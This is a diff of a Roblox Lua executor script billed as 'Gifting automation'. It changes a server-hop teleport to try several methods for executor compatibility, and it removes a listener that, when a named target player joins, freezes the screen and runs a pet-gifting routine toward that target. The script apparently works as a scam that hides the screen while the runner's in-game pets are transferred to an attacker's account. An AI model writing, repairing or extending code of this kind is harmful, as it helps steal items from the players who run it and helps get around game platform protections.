@@ -808,8 +808,23 @@ local function ServerHop(isInitialHop)
     }
     
     local success, error = pcall(function()
-        -- Use simple Teleport method (more compatible with executors)
-        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+        -- Get values safely
+        local placeId = game.PlaceId
+        local player = game.Players.LocalPlayer
+        
+        Log("🔍 Teleport Debug: PlaceId=" .. tostring(placeId) .. ", Player=" .. tostring(player and player.Name or "nil"))
+        
+        -- Try multiple teleport methods for executor compatibility
+        if TeleportService and TeleportService.Teleport then
+            -- Method 1: Standard Teleport
+            TeleportService:Teleport(placeId, player)
+        elseif game:GetService("TeleportService") then
+            -- Method 2: Re-get service
+            local ts = game:GetService("TeleportService")
+            ts:Teleport(placeId, player)
+        else
+            error("TeleportService not available")
+        end
     end)
     
     if success then
@@ -1064,29 +1079,7 @@ end
 
 -- Start the system safely
 pcall(function()
-    spawn(Main)
-end)
-
--- Listen for target joining
-pcall(function()
-    Players.PlayerAdded:Connect(function(player)
-        for _, targetName in ipairs(Config.TargetPlayerNames) do
-            if player.Name == targetName then
-                Log("🎯 Target player joined: " .. player.Name)
-                FreezeScreen()
-                wait(3) -- Give them time to load
-                if not isRunning then
-                    spawn(function()
-                        local target, foundName = FindTargetPlayer()
-                        if target then
-                            ProcessPetGifting(target)
-                        end
-                    end)
-                end
-                break
-            end
-        end
-    end)
+    Main()
 end)
 
 Log("🚀 Gifting automation loaded - single attempt per pet!")
